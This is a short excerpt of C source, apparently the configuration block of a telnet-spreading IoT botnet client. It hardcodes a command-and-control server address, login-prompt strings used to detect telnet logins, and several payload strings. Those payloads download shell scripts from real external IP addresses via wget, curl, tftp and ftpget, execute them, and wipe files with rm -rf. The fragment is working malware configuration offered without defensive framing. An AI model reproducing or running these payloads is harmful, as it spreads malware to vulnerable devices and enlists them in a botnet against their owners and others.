...
// CONFIG
//--------------------------------------------------------------------------------------------------------------------------------------------------------------------
unsigned char *commServer[] = { "148.100.86.186:23" };
char* phone[] = {":", "ogin", "sername", "assword", "Linux", "9615-cdp", (char*)0};
char *Busybox_Payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://148.100.86.186/bins.sh; curl -O http://148.100.86.186/bins.sh; /bin/busybox wget http://94.177.230.2/bin.sh; /bin/busybox tftp 148.100.86.186 -c get tftp1.sh; chmod 777 bins.sh; sh bins.sh; tftp 148.100.86.186 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp1.sh -g 148.100.86.186; chmod 777 tftp1.sh; sh tftp1.sh; ftpget -v -u anonymous -p anonymous -P 21 148.100.86.186 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp1.sh ftp1.sh; rm -rf *\r\n"; //Telnet Scanner Must implement Busybox.
char *Payload = "cd /tmp; rm -rf *; cd /tmp/; wget http://148.100.86.186/bins.sh; sh bins.sh; rm -rf bins.sh; cd /tmp/; wget http://148.100.86.186/bins.sh; sh bins.sh; rm -rf bins.sh"; //Normal Payload Without busybox Implemented.
char *phonepayload = "cd /tmp; rm -rf *; cd /tmp/; wget http://148.100.86.186/bins.sh; sh bins.sh; rm -rf bins.sh; cd /tmp/; wget http://148.100.86.186/bins.sh; sh bins.sh; rm -rf bins.sh\r\n";
